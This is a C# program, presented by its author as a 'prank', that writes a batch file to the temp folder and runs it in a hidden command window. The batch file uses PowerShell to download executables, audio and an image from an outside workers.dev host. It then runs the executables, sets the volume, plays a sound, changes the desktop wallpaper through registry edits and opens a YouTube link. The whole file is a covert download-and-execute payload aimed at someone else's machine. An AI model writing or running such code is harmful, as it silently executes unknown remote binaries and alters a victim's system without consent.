// Made by _xd22 just a cool prank 
// find me on git : justxd22, 
// telegram : @Pine_Orange, @xd2222,
// instagram : @_.xd22 , 
// twitter : idk lol
// https://xd22.me

using System;
using System.IO;
using System.Diagnostics;


class AtnightIsleep
{

static void Main(string[] args)
{
   string tmpfl = Path.GetTempPath();
   string fileName = tmpfl + @"\\batman.bat";
   string[] lol = 
   {
   @"cd %temp%",
   @"Powershell -c ""Invoke-WebRequest \""https://bot.agamyas.workers.dev/3:/Bot Uploads/hk2/PDFBOT.pdf\"" -Outfile PDFBOT.pdf""",
   @"pdf.pdf",
   @"Powershell -c ""Invoke-WebRequest \""https://bot.agamyas.workers.dev/3:/Bot Uploads/hk2/cpl.exe\"" -Outfile cpl.exe""",
   @"Powershell -c ""Invoke-WebRequest \""https://bot.agamyas.workers.dev/3:/Bot Uploads/hk2/SetVol.exe\"" -Outfile SetVol.exe""",
   @"Powershell -c ""Invoke-WebRequest \""https://bot.agamyas.workers.dev/3:/Bot Uploads/hk2/ha.mp3\"" -Outfile ha.mp3""",
   @"SetVol.exe 75",
   @"start /B cpl.exe ha.mp3",
   @"Powershell -c ""Invoke-WebRequest \""https://bot.agamyas.workers.dev/3:/Bot Uploads/hk2/bg.jpg\"" -Outfile bg.jpg""",
   @"reg add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v Wallpaper /t REG_SZ /d %temp%/bg.jpg /f",
   @"reg add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v WallpaperStyle /t REG_SZ /d 2 /f",
   @"reg delete ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v TranscodedImageCache /f",
   @"RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters",
   @"RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True",
   @"RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters",
   @"RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True",
   @"RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters",
   @"RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True",
   @"RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters",
   @"RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True",
   @"ping 127.0.0.1 -n 60 > nul",
   @"start https://www.youtube.com/watch?v=dQw4w9WgXcQ"
   };

   try
   {
     if (File.Exists(fileName))
     {
         File.Delete(fileName);
         var prfile = File.Create(fileName);
         prfile.Close();
         //Console.WriteLine("File exisits and was deleted");
     }
     else
     {
         var prfile = File.Create(fileName);
         prfile.Close();
         //Console.WriteLine("File created");
     }
   }

   catch (Exception Ex)
   {
     Console.WriteLine(Ex.ToString());
   }

   File.WriteAllLines(fileName, lol);

   System.Diagnostics.Process process = new System.Diagnostics.Process();
   System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
   startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
   startInfo.FileName = "CMD.exe";
   startInfo.Arguments = "/C %Temp%\\batman.bat";
   process.StartInfo = startInfo;
   process.Start();

}
